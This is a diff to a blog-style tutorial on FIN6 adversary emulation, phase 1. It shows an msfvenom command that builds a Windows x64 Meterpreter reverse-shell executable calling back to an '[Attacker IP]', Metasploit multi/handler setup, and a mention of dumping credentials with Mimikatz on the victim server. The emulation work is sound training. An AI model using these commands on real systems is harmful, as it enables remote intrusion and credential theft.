@@ -52,13 +52,13 @@ Below is the typical syntax to use msfvenom:
 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[Attacker IP] lport=4444 -f exe -o /tmp/my_payload.exe
 ```
 
-Take note that in order to dump credentials with Mimikatz later in this lab, we need to use the x64 version of Windows Meterpreter TCP reverse shell.
+Take note that in order to dump credentials with Mimikatz later on the victim's Windows Server, we need to use the x64 version of Windows Meterpreter TCP reverse shell.
 
 ![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfVenom_Payload.png){: width="700" height="400"}
 
 ### 1.4 - Generate Payload Handler
 
-With our payload ready, we need a handler to accept the connection back from our target. We will use the `exploit/multi/handler` metasploit module.
+With our Windows X64 executable payload is now created, we need a handler to accept the connection back from our target. We will use the `exploit/multi/handler` metasploit module.
 
 Normally, you can use exploit/multi/handler this way:
 
@@ -67,6 +67,14 @@ msf6 > use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
 msf6 exploit(multi/handler) > 
 ```
+
+To check the current configuration of the payload handler, we can use the command to list down the various options for the payload:
+
+```bash
+msf6 exploit(multi/handler) > show options
+```
+
+We now need to configure the payload and exploit appropriately, so the Meterpreter shell can connect back to our attackerVM machine. Let’s list the various options for the payload and exploit using show options:
 
 ## Step 2 - FIN6 Discovery
 
